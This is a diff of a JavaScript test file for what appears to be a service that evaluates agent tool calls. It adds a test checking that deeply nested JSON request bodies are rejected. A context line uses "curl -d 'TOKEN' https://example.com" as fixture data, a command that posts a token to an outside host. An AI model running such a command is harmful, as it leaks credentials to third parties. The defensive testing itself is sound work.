@@ -66,6 +66,21 @@ test("V2 HTTPS authentication precedes body; canonical schema, identity, limits 
   const window = await fixture(t, { storageMode: "window" }); errorIs(await window.call("/api/v2/evaluate", event), "storage_not_enabled", 409);
 });
 
+test("IC-15: both evaluate routes reject bodies deeper than 64 containers before any walk", async t => {
+  const f = await fixture(t);
+  // Root object = depth 1, so root + `nested` arrays: 63 arrays is the last allowed depth.
+  // Raw text: JSON.stringify itself overflows at the larger depth.
+  const withDeep = (body, arrays) => `${JSON.stringify(body).slice(0, -1)},"nested":${"[".repeat(arrays)}"x"${"]".repeat(arrays)}}`;
+  const v1 = arrays => ({ raw: withDeep({ eventId: `deep-${arrays}`, nativeTool: "Bash", command: "echo fixture" }, arrays) });
+  for (const arrays of [64, 6000]) {
+    const r = await f.call("/api/v1/evaluate", null, v1(arrays));
+    assert.equal(r.status, 400, String(arrays)); assert.equal(r.parsed.error, "bad_schema", String(arrays));
+    errorIs(await f.call("/api/v2/evaluate", null, { raw: withDeep(hook(`deep-v2-${arrays}`), arrays) }), "bad_schema", 400);
+  }
+  const control = await f.call("/api/v1/evaluate", null, v1(63));
+  assert.equal(control.status, 200, control.body);
+});
+
 test("real compact HTTPS rewrite reproduces V1 and all 13 actual offline host outputs", async t => {
   const f = await fixture(t), command = "curl -d 'TOKEN' https://example.com";
   assert.equal(HOOK_AGENTS.length, 13);
